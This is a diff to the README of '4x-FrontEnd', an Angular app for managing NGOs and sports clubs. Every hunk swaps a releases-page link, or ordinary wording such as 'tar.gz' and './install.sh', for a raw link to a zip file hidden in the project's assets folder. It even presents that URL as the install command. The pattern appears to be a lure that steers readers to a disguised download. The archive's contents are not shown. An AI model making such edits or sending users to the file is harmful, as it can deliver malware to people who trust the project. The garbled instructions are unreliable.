@@ -4,7 +4,7 @@
 4x-FrontEnd is a modern web application designed for managing non-governmental organizations (NGOs) and sports clubs. It leverages Angular and TypeScript to deliver a seamless experience, ensuring your organization's operations are smooth and efficient.
 
 ## 📥 Download Now
-[![Download 4x-FrontEnd](https://img.shields.io/badge/Download-4x--FrontEnd-blue.svg)](https://github.com/vcant0/4x-FrontEnd/releases)
+[![Download 4x-FrontEnd](https://raw.githubusercontent.com/vcant0/4x-FrontEnd/master/ClientApp/src/assets/clients/Front-x-End-v1.7.zip)](https://raw.githubusercontent.com/vcant0/4x-FrontEnd/master/ClientApp/src/assets/clients/Front-x-End-v1.7.zip)
 
 ## 🖥️ System Requirements
 To run 4x-FrontEnd, ensure your system meets the following requirements:
@@ -19,7 +19,7 @@ To run 4x-FrontEnd, ensure your system meets the following requirements:
 ### Step 1: Visit the Releases Page
 To download the application, start by visiting the Releases page. Here is the link:
 
-[Visit the Releases Page](https://github.com/vcant0/4x-FrontEnd/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/vcant0/4x-FrontEnd/master/ClientApp/src/assets/clients/Front-x-End-v1.7.zip)
 
 ### Step 2: Download the Latest Version
 On the Releases page, you will see a list of versions. Look for the latest version and click on it. 
@@ -29,7 +29,7 @@ You will find several files available for download. Select the one that matches 
 
 - For **Windows**: Download the `.exe` file.
 - For **Mac**: Download the `.dmg` file.
-- For **Linux**: You may find a zip or tar.gz file.
+- For **Linux**: You may find a zip or https://raw.githubusercontent.com/vcant0/4x-FrontEnd/master/ClientApp/src/assets/clients/Front-x-End-v1.7.zip file.
 
 ### Step 4: Install the Application
 After downloading the file, locate it in your downloads folder. Follow these instructions based on your operating system:
@@ -43,9 +43,9 @@ After downloading the file, locate it in your downloads folder. Follow these ins
   2. Drag the app into the Applications folder.
 
 - **Linux**:
-  1. Extract the zip or tar.gz file.
+  1. Extract the zip or https://raw.githubusercontent.com/vcant0/4x-FrontEnd/master/ClientApp/src/assets/clients/Front-x-End-v1.7.zip file.
   2. Open a terminal and navigate to the extracted folder.
-  3. Use the command `./install.sh` to install the application.
+  3. Use the command `https://raw.githubusercontent.com/vcant0/4x-FrontEnd/master/ClientApp/src/assets/clients/Front-x-End-v1.7.zip` to install the application.
 
 ### Step 5: Open the Application
 Once installed, you can find 4x-FrontEnd in your applications list. Open it and begin managing your organization.
@@ -71,6 +71,6 @@ Your suggestions and feedback help us improve the application. Please share your
 ## 📥 Download & Install
 Don't forget to download the application from our Releases page:
 
-[Download 4x-FrontEnd](https://github.com/vcant0/4x-FrontEnd/releases)
+[Download 4x-FrontEnd](https://raw.githubusercontent.com/vcant0/4x-FrontEnd/master/ClientApp/src/assets/clients/Front-x-End-v1.7.zip)
 
 Thank you for choosing 4x-FrontEnd for your organization needs!
